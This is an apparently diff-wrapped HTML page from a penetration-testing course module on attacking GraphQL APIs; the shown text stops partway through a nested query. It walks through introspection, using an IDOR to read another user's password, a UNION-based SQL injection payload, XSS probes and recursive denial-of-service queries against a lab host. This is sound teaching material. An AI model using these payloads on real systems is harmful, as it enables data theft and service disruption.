@@ -1,0 +1,862 @@
+<html><head></head><body>
+  <div class="container">
+<link rel="stylesheet" href="modules\style.css">
+
+
+<h1 id="attacking-graphql">Attacking GraphQL</h1>
+<h2 id="cheat-sheet">Cheat Sheet</h2>
+<h3 id="basic-example">Basic Example</h3>
+<p><strong>GraphQL Request</strong></p>
+<p>Code: graphql</p>
+<pre><code class="lang-graphql">{
+  users {
+    id
+    username
+    role
+  }
+}
+</code></pre>
+<p><strong>GraphQL Response</strong></p>
+<p>Code: graphql</p>
+<pre><code class="lang-graphql">{
+  <span class="hljs-attr">"data"</span>: {
+    <span class="hljs-attr">"users"</span>: [
+      {
+        <span class="hljs-attr">"id"</span>: <span class="hljs-number">1</span>,
+        <span class="hljs-attr">"username"</span>: <span class="hljs-string">"htb-stdnt"</span>,
+        <span class="hljs-attr">"role"</span>: <span class="hljs-string">"user"</span>
+      },
+      {
+        <span class="hljs-attr">"id"</span>: <span class="hljs-number">2</span>,
+        <span class="hljs-attr">"username"</span>: <span class="hljs-string">"admin"</span>,
+        <span class="hljs-attr">"role"</span>: <span class="hljs-string">"admin"</span>
+      }
+    ]
+  }
+}
+</code></pre>
+<h3 id="introspection-queries">Introspection Queries</h3>
+<p><strong>GraphQL Types</strong></p>
+<p>Code: graphql</p>
+<pre><code class="lang-graphql">{
+  __schema {
+    types {
+      name
+    }
+  }
+}
+</code></pre>
+<p><strong>GraphQL Queries</strong></p>
+<p>Code: graphql</p>
+<pre><code class="lang-graphql">{
+  __schema {
+    queryType {
+      fields {
+        name
+        description
+      }
+    }
+  }
+}
+</code></pre>
+<p><strong>General Introspection</strong></p>
+<p>Code: graphql</p>
+<pre><code class="lang-graphql">query IntrospectionQuery {
+      __schema {
+        queryType { <span class="hljs-keyword">name</span> }
+        mutationType { <span class="hljs-keyword">name</span> }
+        subscriptionType { <span class="hljs-keyword">name</span> }
+        types {
+          ...FullType
+        }
+        directives {
+          <span class="hljs-keyword">name</span>
+          description
+
+          locations
+          args {
+            ...InputValue
+          }
+        }
+      }
+    }
+
+    fragment FullType on __Type {
+      <span class="hljs-keyword">kind</span>
+      <span class="hljs-keyword">name</span>
+      description
+
+      fields(includeDeprecated: true) {
+        <span class="hljs-keyword">name</span>
+        description
+        args {
+          ...InputValue
+        }
+        <span class="hljs-keyword">type</span> {
+          ...TypeRef
+        }
+        isDeprecated
+        deprecationReason
+      }
+      inputFields {
+        ...InputValue
+      }
+      interfaces {
+        ...TypeRef
+      }
+      enumValues(includeDeprecated: true) {
+        <span class="hljs-keyword">name</span>
+        description
+        isDeprecated
+        deprecationReason
+      }
+      possibleTypes {
+        ...TypeRef
+      }
+    }
+
+    fragment InputValue on __InputValue {
+      <span class="hljs-keyword">name</span>
+      description
+      <span class="hljs-keyword">type</span> { ...TypeRef }
+      defaultValue
+    }
+
+    fragment TypeRef on __Type {
+      <span class="hljs-keyword">kind</span>
+      <span class="hljs-keyword">name</span>
+      ofType {
+        <span class="hljs-keyword">kind</span>
+        <span class="hljs-keyword">name</span>
+        ofType {
+          <span class="hljs-keyword">kind</span>
+          <span class="hljs-keyword">name</span>
+          ofType {
+            <span class="hljs-keyword">kind</span>
+            <span class="hljs-keyword">name</span>
+            ofType {
+              <span class="hljs-keyword">kind</span>
+              <span class="hljs-keyword">name</span>
+              ofType {
+                <span class="hljs-keyword">kind</span>
+                <span class="hljs-keyword">name</span>
+                ofType {
+                  <span class="hljs-keyword">kind</span>
+                  <span class="hljs-keyword">name</span>
+                  ofType {
+                    <span class="hljs-keyword">kind</span>
+                    <span class="hljs-keyword">name</span>
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+</code></pre>
+<h3 id="batching-example">Batching Example</h3>
+<p>Code: http</p>
+<pre><code class="lang-http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/graphql</span> HTTP/1.1
+<span class="hljs-attribute">Host</span>: 172.17.0.2
+<span class="hljs-attribute">Content-Length</span>: 86
+<span class="hljs-attribute">Content-Type</span>: application/json
+
+<span class="json">[
+    {
+        <span class="hljs-attr">"query"</span>:<span class="hljs-string">"{user(username: \"admin\") {uuid}}"</span>
+    },
+    {
+        <span class="hljs-attr">"query"</span>:<span class="hljs-string">"{post(id: 1) {title}}"</span>
+    }
+]</span>
+</code></pre>
+<h3 id="mutation-example">Mutation Example</h3>
+<p>Code: graphql</p>
+<pre><code class="lang-graphql">mutation {
+  registerUser(input: {username: <span class="hljs-string">"vautia"</span>, password: <span class="hljs-string">"5f4dcc3b5aa765d61d8327deb882cf99"</span>, role: <span class="hljs-string">"user"</span>, msg: <span class="hljs-string">"newUser"</span>}) {
+    <span class="hljs-keyword">user</span> <span class="hljs-title">{
+      username</span>
+      password
+      msg
+      <span class="hljs-keyword">role</span>
+    <span class="hljs-title">}
+  }
+}</span>
+</code></pre>
+<h3 id="tools">Tools</h3>
+<ul>
+<li><a href="https://github.com/dolevf/graphw00f">graphw00f</a></li>
+<li><a href="https://github.com/graphql-kit/graphql-voyager">graphql-voyager</a></li>
+<li><a href="https://github.com/dolevf/graphql-cop">GraphQL-Cop</a></li>
+<li><a href="https://github.com/doyensec/inql">InQL</a></li>
+</ul>
+<hr>
+<h2 id="introduction-to-graphql">Introduction to GraphQL</h2>
+<hr>
+<p><a href="https://graphql.org/">GraphQL</a> is a query language typically used by web APIs as an alternative to REST. It enables the client to fetch required data through a simple syntax while providing a wide variety of features typically provided by query languages, such as SQL. Like REST APIs, GraphQL APIs can read, update, create, or delete data. However, GraphQL APIs are typically implemented on a single endpoint that handles all queries. As such, one of the main benefits of using GraphQL over traditional REST APIs is efficiency in using resources and requests.</p>
+<hr>
+<h3 id="basic-overview">Basic Overview</h3>
+<p>A GraphQL service typically runs on a single endpoint to receive queries. Most commonly, the endpoint is located at <code>/graphql</code>, <code>/api/graphql</code>, or something similar. For frontend web applications to use this GraphQL endpoint, it needs to be exposed. Just like REST APIs, we can, however, interact with the GraphQL endpoint directly without going through the frontend web application to identify security vulnerabilities.</p>
+<p>From an abstract point of view, GraphQL queries select <code>fields</code> of objects. Each object is of a specific <code>type</code> defined by the backend. The query is structured according to GraphQL syntax, with the name of the <code>query</code> to run at the root. For instance, we can query the <code>id</code>, <code>username</code>, and <code>role</code> fields of all <code>User</code> objects by running the <code>users</code> query:</p>
+<p>Code: graphql</p>
+<pre><code class="lang-graphql">{
+  users {
+    id
+    username
+    role
+  }
+}
+</code></pre>
+<p>The resulting GraphQL response is structured in the same way and might look something like this:</p>
+<p>Code: graphql</p>
+<pre><code class="lang-graphql">{
+  <span class="hljs-attr">"data"</span>: {
+    <span class="hljs-attr">"users"</span>: [
+      {
+        <span class="hljs-attr">"id"</span>: <span class="hljs-number">1</span>,
+        <span class="hljs-attr">"username"</span>: <span class="hljs-string">"htb-stdnt"</span>,
+        <span class="hljs-attr">"role"</span>: <span class="hljs-string">"user"</span>
+      },
+      {
+        <span class="hljs-attr">"id"</span>: <span class="hljs-number">2</span>,
+        <span class="hljs-attr">"username"</span>: <span class="hljs-string">"admin"</span>,
+        <span class="hljs-attr">"role"</span>: <span class="hljs-string">"admin"</span>
+      }
+    ]
+  }
+}
+</code></pre>
+<p>If a query supports arguments, we can add a supported argument to filter the query results. For instance, if the query <code>users</code> supports the <code>username</code> argument, we can query a specific user by supplying their username:</p>
+<p>Code: graphql</p>
+<pre><code class="lang-graphql">{
+  users(<span class="hljs-name">username:</span> <span class="hljs-string">"admin"</span>) {
+    id
+    username
+    role
+  }
+}
+</code></pre>
+<p>We can add or remove fields from the query we are interested in. For instance, if we are not interested in the <code>role</code> field and instead want to obtain the user's password, we can adjust the query accordingly:</p>
+<p>Code: graphql</p>
+<pre><code class="lang-graphql">{
+  users(<span class="hljs-name">username:</span> <span class="hljs-string">"admin"</span>) {
+    id
+    username
+    password
+  }
+}
+</code></pre>
+<p>Furthermore, GraphQL queries support sub-querying, which enables a query to obtain details from an object referencing another object. For instance, assume that a <code>posts</code> query returns a field <code>author</code> that holds a user object. We can then query the username and role of the <code>author</code> in our query like so:</p>
+<p>Code: graphql</p>
+<pre><code class="lang-graphql">{
+  posts {
+    title
+    author {
+      username
+      role
+    }
+  }
+}
+</code></pre>
+<p>The result contains the <code>title</code> of all posts as well as the queried data of the corresponding author:</p>
+<p>Code: graphql</p>
+<pre><code class="lang-graphql">{
+  <span class="hljs-attr">"data"</span>: {
+    <span class="hljs-attr">"posts"</span>: [
+      {
+        <span class="hljs-attr">"title"</span>: <span class="hljs-string">"Hello World!"</span>,
+        <span class="hljs-attr">"author"</span>: {
+          <span class="hljs-attr">"username"</span>: <span class="hljs-string">"htb-stdnt"</span>,
+          <span class="hljs-attr">"role"</span>: <span class="hljs-string">"user"</span>
+        }
+      },
+      {
+        <span class="hljs-attr">"title"</span>: <span class="hljs-string">"Test"</span>,
+        <span class="hljs-attr">"author"</span>: {
+          <span class="hljs-attr">"username"</span>: <span class="hljs-string">"test"</span>,
+          <span class="hljs-attr">"role"</span>: <span class="hljs-string">"user"</span>
+        }
+      }
+    ]
+  }
+}
+</code></pre>
+<p>GraphQL queries support much more complex operations. However, this introductory overview is sufficient for this module. For more details, check out the <a href="https://graphql.org/learn/">Learn</a> section on the official GraphQL website.</p>
+<hr>
+<h2 id="information-disclosure">Information Disclosure</h2>
+<hr>
+<p>Exploiting any service requires thorough enumeration and reconnaissance to identify all possible attack vectors. As attackers, we aim to obtain as much information about a service as possible.</p>
+<hr>
+<h3 id="identifying-the-graphql-engine">Identifying the GraphQL Engine</h3>
+<p>After logging in to the sample web application and investigating all functionality, we can observe multiple requests to the <code>/graphql</code> endpoints that contain GraphQL queries:</p>
+<p><img src="storage\modules\271\info_1.png" alt="GraphQL request and response. Request queries posts with fields: uuid, title, body, category, author (username). Response code 200 with post data: uuid &quot;1&quot;, title &quot;Lorem ipsum 1&quot;, and body text."></p>
+<p>Thus, we can definitively say that the web application implements GraphQL. As a first step, we will identify the GraphQL engine used by the web application using the tool <a href="https://github.com/dolevf/graphw00f">graphw00f</a>. Graphw00f will send various GraphQL queries, including malformed queries, and can determine the GraphQL engine by observing the backend's behavior and error messages in response to these queries.</p>
+<p>After cloning the git repository, we can run the tool using the <code>main.py</code> Python script. We will run the tool in fingerprint (<code>-f</code>) and detect mode (<code>-d</code>). We can provide the web application's base URL to let graphwoof attempt to find the GraphQL endpoint by itself:</p>
+<pre><code class="lang-shell-session">[!bash!]$ python3 main.py -d -f -t <span class="hljs-string">http:</span><span class="hljs-comment">//172.17.0.2</span>
+
+                +-------------------+
+                |     graphw00f     |
+                +-------------------+
+                  ***            ***
+                **                  **
+              **                      **
+    +--------------+              +--------------+
+    |    Node X    |              |    Node Y    |
+    +--------------+              +--------------+
+                  ***            ***
+                     **        **
+                       **    **
+                    +------------+
+                    |   Node Z   |
+                    +------------+
+
+                graphw00f - v1<span class="hljs-number">.1</span><span class="hljs-number">.17</span>
+          The fingerprinting tool <span class="hljs-keyword">for</span> GraphQL
+           Dolev Farhi &lt;dolev<span class="hljs-meta">@lethalbit</span>.com&gt;
+
+[*] Checking <span class="hljs-string">http:</span><span class="hljs-comment">//172.17.0.2/</span>
+[*] Checking <span class="hljs-string">http:</span><span class="hljs-comment">//172.17.0.2/graphql</span>
+[!] Found GraphQL at <span class="hljs-string">http:</span><span class="hljs-comment">//172.17.0.2/graphql</span>
+[*] Attempting to fingerprint...
+[*] Discovered GraphQL <span class="hljs-string">Engine:</span> (Graphene)
+[!] Attack Surface <span class="hljs-string">Matrix:</span> <span class="hljs-string">https:</span><span class="hljs-comment">//github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/graphene.md</span>
+[!] <span class="hljs-string">Technologies:</span> Python
+[!] <span class="hljs-string">Homepage:</span> <span class="hljs-string">https:</span><span class="hljs-comment">//graphene-python.org</span>
+[*] Completed.
+</code></pre>
+<p>As we can see, the graphwoof identified the GraphQL engine <code>Graphene</code>. Additionally, it provides us with the corresponding detailed page in the <a href="https://github.com/nicholasaleks/graphql-threat-matrix">GraphQL-Threat-Matrix</a>, which provides more in-depth information about the identified GraphQL engine:</p>
+<p><i class="fa-arrow-circle-left">:arrow-circle-left:</i> <i class="fa-arrow-right">:arrow-right:</i> <i class="fa-redo">:redo:</i> <i class="fa-home">:home:</i><i class="fa-bars">:bars:</i><img src="storage\modules\271\info_2.png" alt="Security considerations table: Field Suggestions and Introspection enabled by default; Query Depth Limit, Query Cost Analysis, Automatic Persisted Queries, and Debug Mode not supported; Batch Requests disabled by default."></p>
+<p>Lastly, by accessing the <code>/graphql</code> endpoint in a web browser directly, we can see that the web application runs a <a href="https://github.com/graphql/graphiql">graphiql</a> interface. This enables us to provide GraphQL queries directly, which is a lot more convenient than running the queries through Burp, as we do not need to worry about breaking the JSON syntax.</p>
+<hr>
+<h3 id="introspection">Introspection</h3>
+<p><a href="https://graphql.org/learn/introspection/">Introspection</a> is a GraphQL feature that enables users to query the GraphQL API about the structure of the backend system. As such, users can use introspection queries to obtain all queries supported by the API schema. These introspection queries query the <code>__schema</code> field.</p>
+<p>For instance, we can identify all GraphQL types supported by the backend using the following query:</p>
+<pre><code class="lang-graphql">{
+  __schema {
+    types {
+      name
+    }
+  }
+}
+</code></pre>
+<p>The results contain basic default types, such as <code>Int</code> or <code>Boolean</code>, but also all custom types, such as <code>UserObject</code>:</p>
+<p><i class="fa-arrow-circle-left">:arrow-circle-left:</i> <i class="fa-arrow-right">:arrow-right:</i> <i class="fa-redo">:redo:</i> <i class="fa-home">:home:</i><i class="fa-bars">:bars:</i><img src="storage\modules\271\info_3.png" alt="GraphiQL interface showing a query for schema types and names. Results include &quot;UserObject,&quot; &quot;PostObjectConnection,&quot; &quot;PageInfo,&quot; and &quot;Boolean.&quot;"></p>
+<p>Now that we know a type, we can follow up and obtain the name of all of the type's fields with the following introspection query:</p>
+<pre><code class="lang-graphql">{
+  __type(<span class="hljs-name">name:</span> <span class="hljs-string">"UserObject"</span>) {
+    name
+    fields {
+      name
+      type {
+        name
+        kind
+      }
+    }
+  }
+}
+</code></pre>
+<p>In the result, we can see details we would expect from a user object, such as <code>username</code> and <code>password</code>, as well as their data types:</p>
+<p><i class="fa-arrow-circle-left">:arrow-circle-left:</i> <i class="fa-arrow-right">:arrow-right:</i> <i class="fa-redo">:redo:</i> <i class="fa-home">:home:</i><i class="fa-bars">:bars:</i><img src="storage\modules\271\info_4.png" alt="GraphiQL interface showing a query for type &quot;UserObject&quot; with fields: &quot;username&quot; and &quot;password,&quot; both of type &quot;String&quot; and kind &quot;SCALAR.&quot;"></p>
+<p>Furthermore, we can obtain all the queries supported by the backend using this query:</p>
+<pre><code class="lang-graphql">{
+  __schema {
+    queryType {
+      fields {
+        name
+        description
+      }
+    }
+  }
+}
+</code></pre>
+<p>Knowing all supported queries helps us identify potential attack vectors that we can use to obtain sensitive information. Lastly, we can use the following "general" introspection query that dumps all information about types, fields, and queries supported by the backend:</p>
+<pre><code class="lang-graphql">query IntrospectionQuery {
+      __schema {
+        queryType { <span class="hljs-keyword">name</span> }
+        mutationType { <span class="hljs-keyword">name</span> }
+        subscriptionType { <span class="hljs-keyword">name</span> }
+        types {
+          ...FullType
+        }
+        directives {
+          <span class="hljs-keyword">name</span>
+          description
+
+          locations
+          args {
+            ...InputValue
+          }
+        }
+      }
+    }
+
+    fragment FullType on __Type {
+      <span class="hljs-keyword">kind</span>
+      <span class="hljs-keyword">name</span>
+      description
+
+      fields(includeDeprecated: true) {
+        <span class="hljs-keyword">name</span>
+        description
+        args {
+          ...InputValue
+        }
+        <span class="hljs-keyword">type</span> {
+          ...TypeRef
+        }
+        isDeprecated
+        deprecationReason
+      }
+      inputFields {
+        ...InputValue
+      }
+      interfaces {
+        ...TypeRef
+      }
+      enumValues(includeDeprecated: true) {
+        <span class="hljs-keyword">name</span>
+        description
+        isDeprecated
+        deprecationReason
+      }
+      possibleTypes {
+        ...TypeRef
+      }
+    }
+
+    fragment InputValue on __InputValue {
+      <span class="hljs-keyword">name</span>
+      description
+      <span class="hljs-keyword">type</span> { ...TypeRef }
+      defaultValue
+    }
+
+    fragment TypeRef on __Type {
+      <span class="hljs-keyword">kind</span>
+      <span class="hljs-keyword">name</span>
+      ofType {
+        <span class="hljs-keyword">kind</span>
+        <span class="hljs-keyword">name</span>
+        ofType {
+          <span class="hljs-keyword">kind</span>
+          <span class="hljs-keyword">name</span>
+          ofType {
+            <span class="hljs-keyword">kind</span>
+            <span class="hljs-keyword">name</span>
+            ofType {
+              <span class="hljs-keyword">kind</span>
+              <span class="hljs-keyword">name</span>
+              ofType {
+                <span class="hljs-keyword">kind</span>
+                <span class="hljs-keyword">name</span>
+                ofType {
+                  <span class="hljs-keyword">kind</span>
+                  <span class="hljs-keyword">name</span>
+                  ofType {
+                    <span class="hljs-keyword">kind</span>
+                    <span class="hljs-keyword">name</span>
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+</code></pre>
+<p>The result of this query is quite large and complex. However, we can visualize the schema using the tool <a href="https://github.com/graphql-kit/graphql-voyager">GraphQL-Voyager</a>. For this module, we will use the <a href="https://graphql-kit.com/graphql-voyager/">GraphQL Demo</a>. However, in a real engagement, we should follow the GitHub instructions to host the tool ourselves so that we can ensure that no sensitive information leaves our system.</p>
+<p>In the demo, we can click <code>CHANGE SCHEMA</code> and select <code>INTROSPECTION</code>. After pasting the result of the above introspection query in the text field and clicking on <code>DISPLAY</code>, the backend's GraphQL schema is visualized for us. We can explore all supported queries, types, and fields:</p>
+<p><i class="fa-arrow-circle-left">:arrow-circle-left:</i> <i class="fa-arrow-right">:arrow-right:</i> <i class="fa-redo">:redo:</i> <i class="fa-home">:home:</i><i class="fa-bars">:bars:</i><img src="storage\modules\271\info_5.png" alt="GraphQL schema diagram showing three tables: Query, UserObject, and PostObject. Query includes users, posts, user, postByAuthor, and post. UserObject has fields uuid, id, username, password, role, msg, and posts. PostObject contains uuid, id, title, body, category, authorId, and author. Arrows indicate relationships between these tables.">\</p>
+<hr>
+<h2 id="insecure-direct-object-reference-idor-">Insecure Direct Object Reference (IDOR)</h2>
+<hr>
+<p>Like REST APIs, broken authorization, particularly Insecure Direct Object Reference (IDOR) vulnerabilities, are common security issues in GraphQL. To learn more about IDOR vulnerabilities, check out the <a href="https://academy.hackthebox.com/module/details/134">Web Attacks</a> module.</p>
+<hr>
+<h3 id="identifying-idor">Identifying IDOR</h3>
+<p>To identify issues regarding broken authorization, we first need to identify potential attack points that would enable us to access data we are not authorized to access. Enumerating the web application, we can observe that the following GraphQL query is sent when we access our user profile:</p>
+<p><img src="storage\modules\271\idor_1.png" alt="GraphQL request and response. Request: POST to /graphql querying user with username &quot;htb-stdnt&quot; for id, username, msg, and role. Response: HTTP 200 OK, returns user data with id, username &quot;htb-stdnt&quot;, msg &quot;Welcome!&quot;, and role &quot;user&quot;."></p>
+<p>As we can see, user data is queried for the username provided in the query. While the web application automatically queries the data for the user we logged in with, we should check if we can access other user's data. To do so, let us provide a different username we know exists: <code>test</code>. Note that we need to escape the double quotes inside the GraphQL query to not break the JSON syntax:</p>
+<p><img src="storage\modules\271\idor_2.png" alt="GraphQL request and response. Request: POST to /graphql querying user with username &quot;test&quot; for id, username, msg, and role. Response: HTTP 200 OK, returns user data with id, username &quot;test&quot;, msg &quot;Test&quot;, and role &quot;user&quot;."></p>
+<p>As we can see, we can query the user <code>test</code>'s data without any additional authorization checks. Thus, we successfully confirmed a lack of authorization checks in this GraphQL query.</p>
+<hr>
+<h3 id="exploiting-idor">Exploiting IDOR</h3>
+<p>To demonstrate the impact of this IDOR vulnerability, we need to determine what data we can access without authorization. To do so, we are going to use the following introspection queries to determine all fields of <code>User</code> type:</p>
+<p>Code: graphql</p>
+<pre><code class="lang-graphql">{
+  __type(<span class="hljs-name">name:</span> <span class="hljs-string">"UserObject"</span>) {
+    name
+    fields {
+      name
+      type {
+        name
+        kind
+      }
+    }
+  }
+}
+</code></pre>
+<p>As we can see from the result, the <code>User</code> object contains a <code>password</code> field that, presumably, contains the user's password:</p>
+<p><img src="storage\modules\271\idor_3.png" alt="GraphQL request and response. Request: POST to /graphql querying type &quot;UserObject&quot; for name and fields with name, type, and kind. Response: Fields include &quot;username&quot; and &quot;password&quot;, both of type &quot;String&quot; and kind &quot;SCALAR&quot;."></p>
+<p>Let us adjust the initial GraphQL query to check if we can exploit the IDOR vulnerability to obtain another user's password by adding the <code>password</code> field in the GraphQL query:</p>
+<p>Code: graphql</p>
+<pre><code class="lang-graphql">{
+  user(<span class="hljs-name">username:</span> <span class="hljs-string">"test"</span>) {
+    username
+    password
+  }
+}
+</code></pre>
+<p>From the result, we can see that we have successfully obtained the user's password:</p>
+<p><img src="storage\modules\271\idor_4.png" alt="GraphQL request and response. Request: POST to /graphql querying user with username &quot;test&quot; for username and password. Response: HTTP 200 OK, returns username &quot;test&quot; and password as a hashed string."></p>
+<hr>
+<h2 id="injection-attacks">Injection Attacks</h2>
+<hr>
+<p>One of the most common web vulnerabilities are injection attacks such as <a href="https://academy.hackthebox.com/module/details/33">SQL Injection</a>, <a href="https://academy.hackthebox.com/module/details/103">Cross-Site Scripting (XSS)</a>, and <a href="https://academy.hackthebox.com/module/details/109">Command Injection</a>. Like all web applications, GraphQL implementations can also suffer from these vulnerabilities.</p>
+<hr>
+<h3 id="sql-injection">SQL Injection</h3>
+<p>Since GraphQL is a query language, the most common use case is fetching data from some kind of storage, typically a database. As SQL databases are one of the most predominant forms of databases, SQL injection vulnerabilities can inherently occur in GraphQL APIs that do not properly sanitize user input from arguments in the SQL queries executed by the backend. Therefore, we should carefully investigate all GraphQL queries, check whether they support arguments, and analyze these arguments for potential SQL injections.</p>
+<p>Using the introspection query discussed earlier and some trial-and-error, we can identify that the backend supports the following queries that require arguments:</p>
+<ul>
+<li><code>post</code></li>
+<li><code>user</code></li>
+<li><code>postByAuthor</code></li>
+</ul>
+<p>To identify if a query requires an argument, we can send the query without any arguments and analyze the response. If the backend expects an argument, the response contains an error that tells us the name of the required argument. For instance, the following error message tells us that the <code>postByAuthor</code> query requires the <code>author</code> argument:</p>
+<p><img src="storage\modules\271\sqli_1.png" alt="GraphQL request and response. Request: POST to /graphql querying postByAuthor for id and title. Response: HTTP 400 Bad Request, error message states &quot;postByAuthor&quot; argument &quot;author&quot; of type &quot;String&quot; is required but not provided."></p>
+<p>After supplying the <code>author</code> argument, the query is executed successfully:</p>
+<p><img src="storage\modules\271\sqli_2.png" alt="GraphQL request and response. Request: POST to /graphql querying postByAuthor with author &quot;admin&quot; for id and title. Response: HTTP 200 OK, returns posts with ids and titles &quot;Lorem ipsum 1&quot; and &quot;Lorem ipsum 2&quot;."></p>
+<p>We can now investigate whether the <code>author</code> argument is vulnerable to SQL injection. For instance, if we try a basic SQL injection payload, the query does not return any result:</p>
+<p><img src="storage\modules\271\sqli_3.png" alt="GraphQL request and response. Request: POST to /graphql querying postByAuthor with author &quot;admin --&quot; for id and title. Response: HTTP 200 OK, returns postByAuthor as null."></p>
+<p>Let us move on to the <code>user</code> query. If we try the same payload there, the query still returns the previous result, indicating a SQL injection vulnerability:</p>
+<p><img src="storage\modules\271\sqli_4.png" alt="GraphQL request and response. Request: POST to /graphql querying user with username &quot;htb-stdnt --&quot; for uuid, username, and role. Response: HTTP 200 OK, returns user with uuid &quot;1&quot;, username &quot;htb-stdnt&quot;, and role &quot;user&quot;."></p>
+<p>If we simply inject a single quote, the response contains a SQL error, confirming the vulnerability:</p>
+<p><img src="storage\modules\271\sqli_5.png" alt="GraphQL request and response. Request: POST to /graphql querying user with username &quot;htb-stdnt&quot; for uuid, username, and role. Response: HTTP 200 OK, error message indicates a SQL syntax error near &quot;htb-stdnt&quot;."></p>
+<p>Since the SQL query is displayed in the SQL error, we can construct a UNION-based SQL injection query to exfiltrate data from the SQL database. Remember that the database might contain data that we cannot query from the GraphQL API. As such, we should check for any sensitive data in the database that we can access.</p>
+<p>To construct a UNION-based SQL injection payload, let us take another look at the results of the introspection query:</p>
+<p><i class="fa-arrow-circle-left">:arrow-circle-left:</i> <i class="fa-arrow-right">:arrow-right:</i> <i class="fa-redo">:redo:</i> <i class="fa-home">:home:</i><i class="fa-bars">:bars:</i><img src="storage\modules\271\info_5.png" alt="GraphQL schema diagram with three tables: Query, UserObject, and PostObject. Query includes users, posts, user, postByAuthor, and post. UserObject fields: uuid, id, username, password, role, msg, posts. PostObject fields: uuid, id, title, body, category, authorId, author. Arrows show relationships."></p>
+<p>The vulnerable <code>user</code> query returns a <code>UserObject</code>, so let us focus on that object. As we can see, the object consists of six fields and a link (<code>posts</code>). The fields correspond to columns in the database table. As such, our UNION-based SQL injection payload needs to contain six columns to match the number of columns in the original query. Furthermore, the fields we specify in our GraphQL query correspond to the columns returned in the response. For instance, since the <code>username</code> is a <code>UserObject's</code> third field, querying for the <code>username</code> will result in the third column of our UNION-based payload being reflected in the response.</p>
+<p>As the GraphQL query only returns the first row, we will use the <a href="https://mariadb.com/kb/en/group_concat/">GROUP_CONCAT</a> function to exfiltrate multiple rows at a time. This enables us to exfiltrate all table names in the current database with the following payload:</p>
+<p>Code: graphql</p>
+<pre><code class="lang-graphql">{
+  user(<span class="hljs-name">username:</span> <span class="hljs-string">"x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -"</span>) {
+    username
+  }
+}
+</code></pre>
+<p>The response contains all table names concatenated in the <code>username</code> field:</p>
+<p>Code: graphql</p>
+<pre><code class="lang-graphql">{
+  <span class="hljs-attr">"data"</span>: {
+    <span class="hljs-attr">"user"</span>: {
+      <span class="hljs-attr">"username"</span>: <span class="hljs-string">"user,secret,post"</span>
+    }
+  }
+}
+</code></pre>
+<p>Since this is a SQL injection vulnerability just like in any other web application, we can use all SQL payloads and attack vectors to enumerate column names and finally exfiltrate data. For more details on exploiting SQL injections, check out the <a href="https://academy.hackthebox.com/module/details/33">SQL Injection Fundamentals</a> and <a href="https://academy.hackthebox.com/module/details/188">Advanced SQL Injections</a> modules.</p>
+<hr>
+<h3 id="cross-site-scripting-xss-">Cross-Site Scripting (XSS)</h3>
+<p>XSS vulnerabilities can occur if GraphQL responses are inserted into the HTML page without proper sanitization. Similar to the above SQL injection vulnerability, we should investigate any GraphQL arguments for potential XSS injection points. However, in this case, both queries do not return an XSS payload:</p>
+<p><img src="storage\modules\271\xss_1.png" alt="GraphQL request and response. Request: POST to /graphql querying user with username containing a script tag for uuid, username, and role. Response: HTTP 200 OK, returns user as null."></p>
+<p>XSS vulnerabilities can also occur if invalid arguments are reflected in error messages. Let us look at the <code>post</code> query, which expects an integer ID as an argument. If we instead submit a string argument containing an XSS payload, we can see that the XSS payload is reflected without proper encoding in the GraphQL error message:</p>
+<p><img src="storage\modules\271\xss_2.png" alt="GraphQL request and response. Request: POST to /graphql querying post with id containing a script tag for id, title, body, category, and author username. Response: HTTP 400 Bad Request, error message indicates invalid id value, expected type &quot;Int&quot;."></p>
+<p>However, if we attempt to trigger the URL from the corresponding GET-parameter by accessing the URL <code>/post?id=&lt;script&gt;alert(1)&lt;/script&gt;</code>, we can observe that the page simply breaks, and the XSS payload is not triggered.</p>
+<hr>
+<h2 id="denial-of-service-dos-batching-attacks">Denial-of-Service (DoS) &amp; Batching Attacks</h2>
+<hr>
+<p>Depending on the GraphQL API's configuration, we can create queries that result in exponentially large responses and require significant resources to process. This can lead to high hardware utilization on the backend system, potentially leading to a DoS scenario that limits the service's availability to other users.</p>
+<hr>
+<h3 id="denial-of-service-dos-attacks">Denial-of-Service (DoS) Attacks</h3>
+<p>To execute a DoS attack, we must identify a way to construct a query that results in a large response. Let's look at the visualization of the introspection results in <code>GraphQL Voyager</code>. We can identify a loop between the <code>UserObject</code> and <code>PostObject</code> via the <code>author</code> and <code>posts</code> fields:</p>
+<p><i class="fa-arrow-circle-left">:arrow-circle-left:</i> <i class="fa-arrow-right">:arrow-right:</i> <i class="fa-redo">:redo:</i> <i class="fa-home">:home:</i><i class="fa-bars">:bars:</i><img src="storage\modules\271\info_5.png" alt="GraphQL schema diagram with three tables: Query, UserObject, and PostObject. Query includes users, posts, user, postByAuthor, and post. UserObject fields: uuid, id, username, password, role, msg, posts. PostObject fields: uuid, id, title, body, category, authorId, author. Arrows show relationships."></p>
+<p>We can abuse this loop by constructing a query that queries the author of all posts. For each author, we then query the author of all posts again. If we repeat this many times, the result grows exponentially larger, potentially resulting in a DoS scenario.</p>
+<p>Since the <code>posts</code> object is a <code>connection</code>, we need to specify the <code>edges</code> and <code>node</code> fields to obtain a reference to the corresponding <code>Post</code> object. As an example, let us query the author of all posts. From there, we will query all posts by each author and then the author's username for each of these posts:</p>
+<p>Code: graphql</p>
+<pre><code class="lang-graphql">{
+  posts {
+    author {
+      posts {
+        edges {
+          node {
+            author {
+              username
+            }
+          }
+        }
+      }
+    }
+  }
+}
+</code></pre>
+<p>This is an infinite loop we can repeat as many times as we want. If we take a look at the result of this query, it is already quite large because the response grows exponentially larger with each iteration of the loop we query:</p>
+<p><i class="fa-arrow-circle-left">:arrow-circle-left:</i> <i class="fa-arrow-right">:arrow-right:</i> <i class="fa-redo">:redo:</i> <i class="fa-home">:home:</i><i class="fa-bars">:bars:</i><img src="storage\modules\271\dos_1.png" alt="GraphiQL interface showing a query and response. Query: retrieves posts with author and username. Response: data includes posts with author username &quot;admin&quot;."></p>
+<p>Making our initial query large will slow down the server significantly, potentially causing availability issues for other users. For instance, the following query crashes the <code>GraphiQL</code> instance:</p>
+<p>Code: graphql</p>
+<pre><code class="lang-graphql">{
+  posts {
+    author {
+      posts {
+        edges {
+          node {
+            author {
+              posts {
+                edges {
+                  node {
+                    author {
+                      posts {
+                        edges {
+                          node {
+                            author {
+                              posts {
+                                edges {
+                                  node {
+                                    author {
